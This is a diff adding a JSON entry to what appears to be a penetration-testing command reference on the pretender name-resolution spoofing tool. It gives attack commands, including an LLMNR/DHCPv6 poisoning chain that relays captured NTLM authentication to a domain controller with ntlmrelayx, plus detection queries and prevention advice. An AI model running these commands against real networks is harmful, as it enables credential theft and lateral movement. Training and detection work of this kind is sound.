@@ -1,0 +1,104 @@
+{
+  "id": "ad-pretender",
+  "name": "pretender - Modern LLMNR/mDNS/DNS/DHCPv6 Spoofing for MitM",
+  "command": "pretender -i <interface>",
+  "description": "pretender is a modern Go-based man-in-the-middle tool that spoofs LLMNR, mDNS, NetBIOS-NS, and DHCPv6/DNS to redirect victims to the attacker, primarily to feed relay tools like ntlmrelayx or Responder. It is designed to work alongside (not replace) Responder/mitm6, with fine-grained targeting and spoofing controls to reduce noise and avoid breaking the network.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CPTS",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "RedTeamPentesting/pretender",
+  "tags": [
+    "pretender",
+    "mitm",
+    "llmnr",
+    "mdns",
+    "dhcpv6",
+    "spoofing",
+    "ntlm-relay",
+    "ipv6"
+  ],
+  "mitre": [
+    "T1557.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== BASIC (spoof everything on an interface) ===\n  pretender -i eth0\n\n=== DHCPv6 + DNS TAKEOVER (mitm6-style, relay to LDAP) ===\n  pretender -i eth0 --spoof-types DHCPv6 DNS\n  # Pair with ntlmrelayx targeting LDAPS for delegation/ACL abuse\n\n=== TARGETED SPOOFING (reduce noise) ===\n  pretender -i eth0 --spoof <victim_ip> --dont-spoof <gateway_ip>\n  pretender -i eth0 --spoof-for <victim_host>\n\n=== LIMIT PROTOCOLS ===\n  pretender -i eth0 --no-mdns --no-netbios      # LLMNR only\n  pretender -i eth0 --spoof-types LLMNR mDNS\n\n=== REDIRECT TO A SPECIFIC RELAY/HOST ===\n  pretender -i eth0 --ipv4 <lhost> --ipv6 <lhost_v6>\n\n=== TYPICAL CHAIN (relay) ===\n  # Terminal 1: relay captured auth to LDAPS\n  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --no-smb-server -6\n  # Terminal 2: poison name resolution toward us\n  pretender -i eth0 --spoof-types DHCPv6 DNS\n\n=== ALTERNATIVES ===\n  Responder    # classic LLMNR/NBT-NS poisoner + capture\n  mitm6        # DHCPv6/DNS IPv6 takeover\n  Inveigh      # Windows/PowerShell equivalent",
+  "examples": [
+    {
+      "label": "Spoof all on interface",
+      "command": "pretender -i eth0"
+    },
+    {
+      "label": "DHCPv6/DNS takeover for relay",
+      "command": "pretender -i eth0 --spoof-types DHCPv6 DNS"
+    },
+    {
+      "label": "Targeted, low-noise spoofing",
+      "command": "pretender -i eth0 --spoof 10.10.10.50 --dont-spoof 10.10.10.1"
+    }
+  ],
+  "references": [
+    {
+      "title": "pretender",
+      "url": "https://github.com/RedTeamPentesting/pretender"
+    },
+    {
+      "title": "MITRE T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay",
+      "url": "https://attack.mitre.org/techniques/T1557/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-responder-poison",
+      "note": "Responder is the classic LLMNR/NBT-NS alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-mitm6-ipv6-takeover",
+      "note": "mitm6 is the established DHCPv6/DNS takeover tool.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-inveigh-ps",
+      "note": "Inveigh is the Windows-side equivalent.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "LLMNR, mDNS, NBT-NS, and DHCPv6 are trust-on-first-response broadcast/multicast protocols with no authentication. An attacker on the segment answers first, redirecting victims and capturing or relaying their authentication.",
+    "prerequisites": "Layer-2 access to the victim segment; a relay target for captured auth.",
+    "impact": "Capture of NetNTLM hashes (offline crack) or live relay to LDAP/SMB for delegation, ACL abuse, or lateral movement.",
+    "detection": "[MITRE T1557.001] Rogue responses to LLMNR (UDP 5355), mDNS (5353), NBT-NS (137), and unsolicited DHCPv6 advertisements/DNS from a non-DHCP host; a host answering name queries for many different names.",
+    "artifacts": "Spoofed name-resolution replies; sudden IPv6 default DNS pointing to a workstation; NTLM auth to an unexpected host.",
+    "splunk_spl": "index=network (dest_port=5355 OR dest_port=5353 OR dest_port=137 OR dest_port=547)\n| stats dc(query) as names count by src_ip\n| where names > 20",
+    "elastic_kql": "network.protocol:(llmnr or mdns or dhcpv6) and source.ip:*",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort in (5355,5353,137,547)\n| summarize Names=dcount(RemoteUrl) by InitiatingProcessAccountName, LocalIP, bin(Timestamp, 10m)\n| where Names > 20",
+    "sigma_rules": "net_llmnr_nbtns_poisoning",
+    "prevention": "Disable LLMNR (GPO), NBT-NS, and mDNS where unused; disable IPv6 or configure DHCPv6 Guard/RA Guard; enable SMB signing and LDAP channel binding/signing to defeat relay; segment and monitor broadcast domains.",
+    "sources": [
+      "RedTeamPentesting",
+      "https://attack.mitre.org/techniques/T1557/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Name-resolution poisoning (pretender/Responder/mitm6)",
+        "logic": "DeviceNetworkEvents\n| where RemotePort in (5355,5353,137,547)\n| summarize DistinctNames=dcount(RemoteUrl), Events=count() by DeviceName, LocalIP, bin(Timestamp, 10m)\n| where DistinctNames > 20",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate mDNS-heavy environments (printers, casting)",
+        "tuning": "Alert when a single non-infrastructure host answers many distinct name queries or advertises DHCPv6/DNS"
+      }
+    ]
+  }
+}
